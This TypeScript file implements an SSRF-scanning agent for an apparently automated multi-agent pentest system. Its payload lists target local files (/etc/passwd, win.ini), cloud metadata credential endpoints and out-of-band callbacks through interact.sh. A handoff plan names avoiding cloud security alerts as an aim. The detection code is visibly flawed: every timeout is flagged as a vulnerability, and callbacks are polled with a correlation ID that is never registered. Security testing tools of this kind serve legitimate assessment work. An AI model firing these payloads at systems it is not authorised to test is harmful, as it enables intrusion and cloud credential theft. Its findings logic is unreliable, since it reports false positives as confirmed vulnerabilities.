/**
 * SSRF Detection Agent
 * Detects Server-Side Request Forgery vulnerabilities
 */

import { BaseAgent } from './base';
import type { SSRFDetectionJob, Finding, Evidence } from '../../../shared/types';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';
import { exec } from 'child_process';
import { promisify } from 'util';
import logger from '../utils/logger';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import knowledgeStore from '../services/knowledge/knowledge-store';
import { sharedMemory } from '../services/three-agent/shared-memory';
import AgentCoordination from '../services/agent-coordination';

const execAsync = promisify(exec);

export class SSRFAgent extends BaseAgent<SSRFDetectionJob> {
  private enhanced = new EnhancedAgentCapabilities();
  constructor() {
    super('ssrf' as any); // AgentType might not include ssrf yet
  }

  getSteps(): { name: string; metadata?: any }[] {
    return [
      { name: 'Generate SSRF payloads for various attack vectors' },
      { name: 'Test each target with URL manipulation payloads' },
      { name: 'Test redirect-based SSRF vulnerabilities' },
      { name: 'Test file protocol access' },
      { name: 'Test cloud metadata endpoint access' },
      { name: 'Monitor out-of-band callbacks' },
      { name: 'Analyze responses for SSRF indicators' },
      { name: 'Create findings for confirmed vulnerabilities' },
    ];
  }

  async process(job: any): Promise<any> {
    const jobData: SSRFDetectionJob = job.data;
    logger.info({ jobId: jobData.id }, 'Starting SSRF detection');

    const findings: Finding[] = [];
    const { targets, oobServer, payloadTypes, timeout } = jobData.options;

    for (const target of targets) {
      logger.info({ target }, 'Testing target for SSRF');

      // Generate unique identifier for this test
      const testId = uuidv4().substring(0, 8);
      const oobUrl = `${oobServer}/${testId}`;

      for (const payloadType of payloadTypes) {
        const payloads = this.generatePayloads(payloadType, oobUrl);

        for (const payload of payloads) {
          try {
            const result = await this.testPayload(target, payload, oobUrl, testId, timeout);

            if (result.vulnerable) {
              const finding = await this.createFinding(
                jobData,
                target,
                payloadType,
                payload,
                result.evidence
              );
              findings.push(finding);

              logger.info(
                {
                  target,
                  payloadType,
                  severity: finding.severity,
                },
                'SSRF vulnerability detected'
              );
            }
          } catch (error: any) {
            logger.error(
              {
                target,
                payload,
                error: error.message,
              },
              'Error testing SSRF payload'
            );
          }
        }
      }
    }

    // 🚀 THREE-AGENT INTEGRATION: Write SSRF findings to shared memory
    const swarmData = jobData as any;
    const { swarmId, enableSharedMemory } = swarmData;
    if (swarmId && enableSharedMemory && findings.length > 0) {
      try {
        const ssrfFindings = findings.map((finding) => ({
          id: finding.id,
          type: 'ssrf',
          severity: finding.severity,
          url: finding.assetId || 'unknown',
          evidence: JSON.stringify(finding.evidence),
          confidence: finding.confidence,
          timestamp: new Date(),
          discoveredBy: `ssrf-${jobData.id}`,
          metadata: {
            payloadType: finding.title,
            oobTriggered: true,
            cvss: finding.cvss,
          },
        }));

        await sharedMemory.storeFindings(swarmId, ssrfFindings);

        // Share successful SSRF techniques
        const uniquePayloadTypes = [...new Set(findings.map((f) => f.title))];
        for (const payloadType of uniquePayloadTypes.slice(0, 10)) {
          await sharedMemory.shareSuccess(swarmId, {
            id: uuidv4(),
            name: `ssrf-${payloadType}`,
            description: `SSRF payload type ${payloadType} successful`,
            successRate: 0.85,
            metadata: { payloadType, source: 'ssrf-agent' },
          });
        }

        logger.info(
          {
            swarmId,
            ssrfFindings: findings.length,
            payloadTypes: uniquePayloadTypes.length,
          },
          '🔗 SSRF agent shared findings with swarm'
        );
      } catch (error) {
        logger.error({ error, swarmId }, 'Failed to share SSRF findings');
      }
    }

    // 🚀 RICH HANDOFF: SSRF → Confirm for OOB-triggered findings
    const confirmedSSRF = findings.filter((f: any) => f.confidence >= 0.8);
    if (confirmedSSRF.length > 0) {
      await this.handoffToConfirm(jobData.id, jobData.programId, confirmedSSRF, findings);
    }

    return {
      findings,
      summary: {
        targetsScanned: targets.length,
        vulnerabilitiesFound: findings.length,
      },
    };
  }

  /**
   * Rich handoff to Confirm agent for SSRF validation
   */
  private async handoffToConfirm(
    ssrfJobId: string,
    programId: string,
    vulns: any[],
    allFindings: any[]
  ): Promise<void> {
    try {
      const confirmJobId = uuidv4();
      const queue = require('../services/queue').default;
      const storage = require('../services/storage').default;

      const vulnsContent = JSON.stringify(vulns, null, 2);
      const s3Key = await storage.uploadText(
        storage.generateKey(programId, 'ssrf', `${ssrfJobId}-confirmed.json`),
        vulnsContent
      );

      await this.createRichHandoff(
        ssrfJobId,
        programId,
        'confirm',
        {
          parentResult: {
            totalSSRFVulns: vulns.length,
            vulnsFile: s3Key,
            oobTriggered: vulns.length, // All passed OOB validation
            byProtocol: {
              http: vulns.filter((v) => v.title?.toLowerCase().includes('http')).length,
              dns: vulns.filter((v) => v.title?.toLowerCase().includes('dns')).length,
            },
            internalIPs: vulns.filter((v) => v.evidence?.toString().match(/192\.168\.|10\.|172\./))
              .length,
            avgConfidence: vulns.reduce((sum, v) => sum + v.confidence, 0) / vulns.length,
          },
          reasoning: {
            trigger: 'oob-ssrf-detected',
            confidence: 0.93,
            alternatives: ['skip-confirmation', 'manual-verification'],
            decisionFactors: [
              `Found ${vulns.length} OOB-triggered SSRF vulnerabilities`,
              'SSRF confirmation validates internal network access and cloud metadata exposure',
              'Multi-protocol testing confirms full exploitation scope',
            ],
          },
          objectives: {
            primary: 'Multi-protocol SSRF confirmation with internal service discovery',
            secondary: [
              'Validate HTTP/DNS/FTP protocol exploitation',
              'Discover accessible internal services and IP ranges',
              'Test cloud metadata endpoint access (AWS, GCP, Azure)',
              'Confirm file:// protocol access for local file read',
            ],
            avoid: [
              'False positives from WAF/proxy responses',
              'Destructive internal network scanning',
              'Triggering cloud security alerts',
            ],
          },
          successCriteria: {
            minAssets: Math.floor(vulns.length * 0.7), // 70% confirmation
            maxDuration: vulns.length * 25, // 25 seconds per vuln
            requiredFields: ['url', 'confirmed', 'protocol', 'internalAccess'],
            qualityThreshold: 0.9,
          },
          inherited: {
            programId,
            rateLimit: 20, // Very conservative for SSRF
            timeout: vulns.length * 25000,
            safetyChecks: true,
            budget: { timeSeconds: vulns.length * 25 },
          },
        },
        {
          format: 'confirmation-result',
          requiredFields: ['confirmed', 'protocol', 'internalServices', 'evidence'],
          shouldTriggerNextHandoff: true,
          expectedVolume: vulns.length,
        }
      );

      await queue.addJob('confirm', {
        id: confirmJobId,
        type: 'confirm',
        programId,
        priority: 10,
        status: 'pending',
        attempts: 0,
        maxAttempts: 3,
        options: {
          ssrfJobId,
          vulnsFile: s3Key,
          vulns: vulns.slice(0, 30),
          confirmationType: 'ssrf',
        },
        metadata: {
          requestedBy: 'ssrf-agent',
          handoffOrigin: 'rich-handoff',
          vulnsCount: vulns.length,
        },
        createdAt: new Date(),
      });

      logger.info({ vulns: vulns.length, confirmJobId }, '🤝 Rich handoff: SSRF → Confirm');
    } catch (error: any) {
      logger.error({ error }, 'Failed rich handoff to Confirm agent');
    }
  }

  /**
   * Generate SSRF payloads based on type
   */
  private generatePayloads(type: string, oobUrl: string): string[] {
    const payloads: string[] = [];

    switch (type) {
      case 'url':
        payloads.push(
          oobUrl,
          `http://${oobUrl}`,
          `https://${oobUrl}`,
          `//  ${oobUrl}`,
          `@${oobUrl}`,
          `http://127.0.0.1@${oobUrl}`,
          `http://localhost@${oobUrl}`
        );
        break;

      case 'redirect':
        payloads.push(
          `http://127.0.0.1?redirect=${encodeURIComponent(oobUrl)}`,
          `http://localhost?url=${encodeURIComponent(oobUrl)}`,
          `http://127.0.0.1?next=${encodeURIComponent(oobUrl)}`
        );
        break;

      case 'file':
        payloads.push(
          'file:///etc/passwd',
          'file:///c:/windows/win.ini',
          'file://localhost/etc/passwd'
        );
        break;

      case 'cloud_metadata':
        payloads.push(
          'http://169.254.169.254/latest/meta-data/',
          'http://metadata.google.internal/computeMetadata/v1/',
          'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
        );
        break;
    }

    return payloads;
  }

  /**
   * Test a payload for SSRF
   */
  private async testPayload(
    target: string,
    payload: string,
    oobUrl: string,
    testId: string,
    timeout: number
  ): Promise<{ vulnerable: boolean; evidence: Evidence[] }> {
    const evidence: Evidence[] = [];
    let vulnerable = false;

    // Test with various injection points
    const injectionPoints = [
      { param: 'url', value: payload },
      { param: 'redirect', value: payload },
      { param: 'callback', value: payload },
      { param: 'webhook', value: payload },
      { param: 'fetch', value: payload },
    ];

    for (const injection of injectionPoints) {
      try {
        const testUrl = `${target}?${injection.param}=${encodeURIComponent(injection.value)}`;

        // Make request
        const startTime = Date.now();
        const response = await axios.get(testUrl, {
          timeout: timeout * 1000,
          maxRedirects: 5,
          validateStatus: () => true, // Accept any status
        });

        const duration = Date.now() - startTime;

        evidence.push({
          type: 'request',
          content: `GET ${testUrl}`,
          metadata: {
            param: injection.param,
            payload: injection.value,
          },
          timestamp: new Date(),
        });

        evidence.push({
          type: 'response',
          content: `Status: ${response.status}\nHeaders: ${JSON.stringify(response.headers)}\nBody: ${String(response.data).substring(0, 500)}`,
          metadata: {
            status: response.status,
            duration,
          },
          timestamp: new Date(),
        });

        // Check for indicators of SSRF
        const indicators = this.checkSSRFIndicators(response.data, response.status, duration);

        if (indicators.detected) {
          vulnerable = true;
          evidence.push({
            type: 'log',
            content: `SSRF indicators detected: ${indicators.reasons.join(', ')}`,
            timestamp: new Date(),
          });
        }

        // Wait and check OOB server for callback
        if (oobUrl.includes('http')) {
          await this.sleep(2000); // Wait 2 seconds for callback

          const oobCheck = await this.checkOOBServer(testId);
          if (oobCheck.received) {
            vulnerable = true;
            evidence.push({
              type: 'log',
              content: `Out-of-band callback received: ${oobCheck.details}`,
              timestamp: new Date(),
            });
          }
        }
      } catch (error: any) {
        // Timeout or network error might indicate SSRF
        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
          evidence.push({
            type: 'log',
            content: `Request timeout - possible SSRF to internal network`,
            timestamp: new Date(),
          });
          vulnerable = true;
        }
      }
    }

    return { vulnerable, evidence };
  }

  /**
   * Check response for SSRF indicators
   */
  private checkSSRFIndicators(
    body: any,
    status: number,
    duration: number
  ): { detected: boolean; reasons: string[] } {
    const reasons: string[] = [];

    // Convert body to string
    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);

    // Check for cloud metadata indicators
    if (bodyStr.includes('ami-id') || bodyStr.includes('instance-id')) {
      reasons.push('AWS metadata detected');
    }

    if (bodyStr.includes('project-id') || bodyStr.includes('computeMetadata')) {
      reasons.push('GCP metadata detected');
    }

    // Check for file content indicators
    if (bodyStr.includes('root:x:0:0') || bodyStr.includes('[boot loader]')) {
      reasons.push('Local file read detected');
    }

    // Check for internal network indicators
    if (
      bodyStr.includes('127.0.0.1') ||
      bodyStr.includes('localhost') ||
      bodyStr.includes('192.168.')
    ) {
      reasons.push('Internal network reference detected');
    }

    // Suspicious long duration might indicate internal network request
    if (duration > 5000) {
      reasons.push('Unusually long response time');
    }

    return {
      detected: reasons.length > 0,
      reasons,
    };
  }

  /**
   * Check OOB server for callbacks
   * Integrates with interact.sh API to check for out-of-band interactions
   */
  private async checkOOBServer(testId: string): Promise<{ received: boolean; details?: string }> {
    try {
      // Check if using interact.sh
      const interactshRegex = /([a-z0-9]+)\.interact\.sh/i;

      // Extract the correlation ID from testId (used in subdomain)
      // The testId should be embedded in the OOB URL as a subdomain
      const correlationId = testId;

      // Poll interact.sh API to check for interactions
      // API endpoint: https://interact.sh/api/data
      // The API requires the correlation-id to fetch interactions for that specific test
      const apiUrl = 'https://interact.sh/api/data';

      const response = await axios.post(
        apiUrl,
        {
          'correlation-id': correlationId,
        },
        {
          headers: {
            'Content-Type': 'application/json',
          },
          timeout: 5000,
        }
      );

      // Check if any interactions were recorded
      if (response.data && Array.isArray(response.data) && response.data.length > 0) {
        const interactions = response.data;
        const details = interactions
          .map((interaction: any) => {
            return `${interaction.protocol || 'HTTP'} request from ${interaction['remote-address'] || 'unknown'} at ${interaction.timestamp || ''}`;
          })
          .join('; ');

        logger.info({ testId, interactions }, 'OOB interaction detected');
        return { received: true, details };
      }

      return { received: false };
    } catch (error: any) {
      logger.warn({ error: error.message, testId }, 'Failed to check OOB server');
      // Return false rather than throwing to prevent blocking the scan
      return { received: false };
    }
  }

  /**
   * Register a unique OOB domain with interact.sh
   * Returns a unique subdomain that can be used for OOB testing
   */
  private async registerOOBDomain(): Promise<{ domain: string; correlationId: string } | null> {
    try {
      // Register with interact.sh API
      // API endpoint: https://interact.sh/api/register
      const apiUrl = 'https://interact.sh/api/register';

      const response = await axios.post(
        apiUrl,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
          },
          timeout: 10000,
        }
      );

      if (response.data && response.data.domain && response.data['correlation-id']) {
        const domain = response.data.domain;
        const correlationId = response.data['correlation-id'];

        logger.info({ domain, correlationId }, 'Registered OOB domain with interact.sh');
        return { domain, correlationId };
      }

      return null;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Failed to register OOB domain with interact.sh');
      return null;
    }
  }

  /**
   * Create finding from SSRF detection
   */
  private async createFinding(
    job: SSRFDetectionJob,
    target: string,
    payloadType: string,
    payload: string,
    evidence: Evidence[]
  ): Promise<Finding> {
    const severity = this.calculateSeverity(payloadType);

    return {
      id: uuidv4(),
      programId: job.programId,
      assetId: '', // Would be populated by orchestrator
      severity,
      confidence: 0.8,
      title: `Server-Side Request Forgery (SSRF) - ${payloadType}`,
      description: `A Server-Side Request Forgery vulnerability was detected in ${target}. The application accepts user-supplied URLs and makes server-side requests without proper validation.`,
      cwe: ['CWE-918'],
      evidence,
      poc: {
        steps: [
          'Send a request to the vulnerable endpoint with a malicious URL',
          `Use payload: ${payload}`,
          'Observe the server making a request to the attacker-controlled URL or internal resource',
        ],
        payload,
        reproductionRate: 0.9,
      },
      impact: this.generateImpact(payloadType),
      remediation: `Implement strict input validation and whitelist allowed protocols and domains. Use a deny-list approach for internal IP ranges. Consider using a dedicated service for URL fetching with network isolation.`,
      status: 'new',
      confirmations: [],
      createdAt: new Date(),
      updatedAt: new Date(),
    };
  }

  /**
   * Calculate severity based on payload type
   */
  private calculateSeverity(payloadType: string): 'critical' | 'high' | 'medium' | 'low' | 'info' {
    switch (payloadType) {
      case 'cloud_metadata':
        return 'critical';
      case 'file':
        return 'high';
      case 'url':
        return 'high';
      case 'redirect':
        return 'medium';
      default:
        return 'medium';
    }
  }

  /**
   * Generate impact description
   */
  private generateImpact(payloadType: string): string {
    const impacts: Record<string, string> = {
      cloud_metadata:
        'An attacker can access cloud metadata endpoints to retrieve sensitive information such as IAM credentials, API keys, and instance configuration. This can lead to full cloud account compromise.',
      file: 'An attacker can read arbitrary files from the server filesystem, potentially accessing configuration files, credentials, source code, and other sensitive data.',
      url: 'An attacker can make the server perform requests to internal network resources, potentially bypassing firewalls and accessing internal services not exposed to the internet.',
      redirect:
        'An attacker can abuse the server as a proxy to perform port scanning, bypass IP-based access controls, and access internal resources.',
    };

    return (
      impacts[payloadType] ||
      'An attacker can manipulate server-side requests to access unintended resources.'
    );
  }

  /**
   * Helper: Sleep
   */
  private sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}
